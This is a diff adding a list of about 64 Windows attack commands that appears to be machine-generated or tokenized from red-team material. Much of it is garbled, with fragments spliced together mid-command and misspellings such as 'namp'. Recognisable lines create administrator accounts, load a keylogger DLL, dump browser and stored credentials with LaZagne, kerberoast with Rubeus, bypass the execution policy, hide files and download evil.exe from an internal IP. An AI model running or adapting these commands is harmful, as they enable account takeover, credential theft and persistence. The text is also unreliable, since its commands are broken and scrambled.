@@ -1,0 +1,64 @@
+ttdinject.exe /clientparams `` inprocserver32 -- http : -gcb -o bypass
+get-eventlog -list | localappdata % \microsoft\teams\current\teams.exe
+git clone $ { - $ { -path = `` $ { registry_path
+net user administrator administrator /add
+net localgroup administrators
+attrib +h `` $ { output_zip_name } /add
+net user = `` domain admins '' `` '' `` $ { volumn name you create = `` set-wmiinstance name = set-wmiinstance file set-wmiinstance -expandproperty string
+hack-browser-data-windows-64bit.exe
+reg query /server : hkey_local_machine\system\currentcontrolset\control\lsa /d `` cor_enable_profiling
+net stop
+reg `` hklm\software\microsoft\windows hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v `` keylog
+set-executionpolicy -executionpolicy bypass -scope localmachine -force
+rundll32 keylogger_dll.dll , keylog
+net localgroup
+winrar a `` $ : -r /user : = $ { filename_regex }
+namp -sn $ target t1547.009 . `` $ : username
+net start spooler
+quser
+net accounts
+net user administrator /add
+rundll32.exe c : new-object net.webclient ) \\ $ -path $ { % localappdata % select-object mainwindowtitle
+net user `` `` $ ( t1547.009 ;
+net localgroup administrators
+namp -sn $ target t1547.009 . `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest
+net localgroup administrators administrators
+rdrleakdiag.exe /p $ target = `` $ target )
+vssadmin create shadow foreach-object ( new-object net.webclient ) \\ $ /set http : \system\currentcontrolset\services\winsock2\parameters -name `` hkcu : '' \windows\system32\at.exe $ { user_name } ;
+bitsadmin.exe /create $ { filename_regex
+python make_image.py $ { namp '' $ filtertoconsumerbinding = `` $ { filename_regex }
+new-item -path `` clearing $ : \windows\system32\desk.cpl , installscreensaver $ : new-object -comobject ) ; querylanguage= '' '' $ i @ ( `` set-wmiinstance -namespace /v `` hklm\system\currentcontrolset\services\winsock2\parameters '' -class -startaddress $ shortcutlocation -class within team '' /f
+net localgroup administrators administrators
+net localgroup administrators administrators
+net user administrator @ `` $ { filename_regex }
+nmap -o $ { filename_regex
+net localgroup administrators
+query user
+$ a = `` : cor_profiler = `` administrators '' -- threadingmodel '' -name `` autorun ''
+reg query spooler : administrators : @ i in $ filter ; consumer = `` \software\microsoft\command processor % $ wscriptshell.createshortcut ( $ filter = set-wmiinstance file new-object -comobject ; querylanguage= '' set __eventfilter
+net localgroup administrators
+net user = `` hklm\software\microsoft\windows t1547.009 . `` security \windows\system32\ $ { filename_regex }
+get-childitem -filter `` 7 /v `` $ profile /y
+add-localgroupmember -group `` administrators `` administrators '' '' `` @ % `` $ { filename_regex } in @ $ { target volumn name you keylog
+net localgroup administrators
+net localgroup administrators administrators
+remove-item -path $ { /for=c
+net user administrator `` @ { volumn name = set-wmiinstance , minidump ( \users\ $ ( set-wmiinstance file execution -comobject wscript.shell ; :utf8.getstring : = `` : = set-wmiinstance .\redirect.sdb
+iediagcmd.exe /out : $ { filename_regex }
+net localgroup administrators
+adfind.exe -f /r c : new-object os ; os.system = ( ' servicepackminorversion
+cmdkey /list
+attrib +h = `` cor_profiler
+namp -sn '' $ { filename_regex }
+copy `` .\lazagne -list foreach-object ( s3cur3th1ssh1t_repo='https : = hklm\software\microsoft\windows //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+set-psreadlineoption -historysavestyle /s /q $ { hklm\software\microsoft\windows source_file_path ; name = set-wmiinstance , administrators = `` keylog
+bitsadmin.exe /create $ { user_name }
+rubeus.exe kerberoast windir % \system32\osk.exe administrators
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam /t reg_dword /v debugger /d 0 /f
+gpresult /z
+gpresult /z
+adfind.exe /y $ { -member `` administrators '' '' $ { filename_regex }
+net user administrator in $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+stordiag.exe
+-u windir % windir volumn tracking
+net user administrator /add
